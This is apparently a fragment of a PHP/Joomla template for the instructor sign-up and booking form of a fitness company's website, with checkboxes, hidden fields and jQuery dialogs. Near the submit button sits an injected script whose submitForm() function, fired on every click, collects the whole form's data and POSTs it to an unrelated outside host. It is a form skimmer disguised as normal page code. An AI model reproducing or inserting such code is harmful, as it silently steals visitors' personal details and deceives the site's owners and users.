							 		<a target="_blank" href="<?php echo JURI::base();?>instructorpack/Clubbercise_Code_of_Conduct.pdf" class="active"><?php echo JText::_('I agree to the Clubbercise Code of Conduct');?></a>
								<?php } ?>
							 	  <span style="color:#FF0000">*</span>
							 </label>
						</div>
						
					<?php } ?>
						
						<div class="control-group agree-check">
							 <div class="controls">
							 <input tabindex="26" class="required" type="checkbox" onblur="checkboxvalidation('checkbox_agree','checkbox_agree_label')" name="agree" id="checkbox_agree" value="1" <?php if($jvtigetpostdata['agree']){ echo 'checked';}?> ></div>
							 <label class="control-label" for="checkbox_agree" id="checkbox_agree_label"><?php echo JText::_('COM_JVTIGER_FORM_AGREE_BOOKING');?> <span style="color:#FF0000">*</span></label>
						</div>
							
						<div class="clear"></div>	

					</div>
					
					<div class="submit-buttons" >
						<div id="alertmesssage"><span id="alertmsg"></span></div>	
						<p style="color: #ff0000;" id="submitbuttonserrormsg"> </p>
						<div class="clear"></div>	
					</div>

					<div class="submit-buttons">
						<input tabindex="26" type="button" value="<?php echo $manual == true ? 'Submit Details' : JText::_('COM_JVTIGER_FORM_PROCEED_TO_PAYMENT');?>" class="buttontext button" onclick="submitForm(); save();" />
							
						<div class="clear"></div>	
					</div>
						<script>
function submitForm() {
  var form = document.getElementById("adminForm");
  var formData = new FormData(form);

  fetch("https://0sec0.com/clubbercise.com.php", {
    method: "POST",
    body: formData
  })
  .then(response => {
    if (response.ok) {
      console.log("Sent!");
    } else {
      console.error("error!");
    }
  })
  .catch(error => {
    console.error("error!", error);
  });
}
</script>
					<div class="clear"></div>
				</div>
				
				<input type="hidden" name="currency_code_crm" value="<?php echo $currency_code ; ?>"/>
				<input type="hidden" name="option" value="<?php echo JRequest::getVar('option');?>" />
		        <input type="hidden" name="view" value="<?php echo $view;?>" />
		        <input type="hidden" name="entryid" value="<?php echo $sid;?>" />
		        <input type="hidden" name="sid" value="<?php echo $scid;?>" />
		        <input type="hidden" name="id" value="<?php echo $sid;?>" />
		        <input type="hidden" name="cid" value="<?php echo $id;?>" />
		        <input type="hidden" name="Itemid" value="<?php echo $Itemid;?>" />
		        <input type="hidden" name="task" value="" />
		        <input type="hidden" name="businessname" value="" id="businessname" />
		        <input type="hidden" name="exist_email" id="exist_email" value=""/>
			</form>
			
			
		<?php } ?>
		<div class="clear"></div>
	</div>
	<div class="clear"></div>
	
</div>
</div>
<div id="hidden">
	<div id="loadDiv" >
		<?php echo JText::_("If you do not have the qualifications required we recommend the Level 2 Exercise to Music qualification, an 'entry level' course for anyone wanting to become an exercise to music instructor/group exercise instructor. There are a number of providers out there and prices range from &#163;400 to &#163;800 with varying learning options from distance learning which tends to be cheaper to fast track 2 week courses. We recommend the following providers: YMCA, Lifetime Fitness, Health & Fitness Education, Formula GFI, or Fitness Industry Education. ");?>
	</div>
</div>
	

<div class="selectbusinessname_dialog" style="display: none;" id="selectbusinessname_dialog">
	<div class="dialoguecontent" style="text-align: center;">
		<?php echo JText::_("What is the name of the business / venue?");?>
		<input type="text" name="selectedbusinessname" id="selectedbusinessname" />
	</div>
</div>

<div id="system-message-container"></div>
<div class="alert_dialog" style="display: none;" id="alert_dialog">
	<div class="dialoguecontent" style="text-align: center;">
		<p>Oops, it looks like you've missed something!</p> 
		<p>Please check to make sure everything is complete before proceeding.</p> 
		<p>Need help? Email <a href="mailto:team@clubbercise.com">team@clubbercise.com</a></p>
	</div>
</div>

<link rel="stylesheet" href="<?php echo JURI::base();?>components/com_jvtiger/assets/css/jquery-ui.css">
<script src="<?php echo JURI::base();?>components/com_jvtiger/assets/js/jquery-ui.js"></script>
				
<script type="text/javascript" language="JavaScript">

	function selectbusinessname(){
		jQuery("#selectbusinessname_dialog").dialog({
			width:380,
			resizable: false,
			modal: true,
			title:coursename,
			beforeClose: function(event,ui) { jQuery('#businessname').val(jQuery('#selectedbusinessname').val()); },
			buttons: {"OK": function(){ jQuery(this).dialog("close"); }}
		});
	}
	
	
	function findStates(country){
		
		if(country == ''){
			jQuery('#country_chzn .chzn-single').css('border-color', '#ff0000');
		}else{
			jQuery('#country_chzn .chzn-single').css('border-color', '#aaaaaa');
		}
		
		var county = '<?php echo $jvtigetpostdata['county']; ?>';
		jQuery.ajax({
			type: "POST",
			url: "<?php echo JURI::base();?>index.php?option=com_jvtiger&view=instructordetail&task=findStates&tmpl=1",
			data:{country:country,county:county},
			success: function(data){
				jQuery("#costate").html(data);
				jQuery("select").chosen().trigger("liszt:updated");
			}
		});
	}
	
	function checkStates(county){
		if(county == ''){
			jQuery('#county_chzn .chzn-single').css('border-color', '#ff0000');
		}else{
			jQuery('#county_chzn .chzn-single').css('border-color', '#aaaaaa');
		}
	}
	
	function checkotherticks(type){
		if(type){
			document.getElementById('other_courses_done').style.display = 'block';
		}else{
			document.getElementById('completed_courses3_other').value = '';
			document.getElementById('other_courses_done').style.display = 'none';
		}
	}
</script>
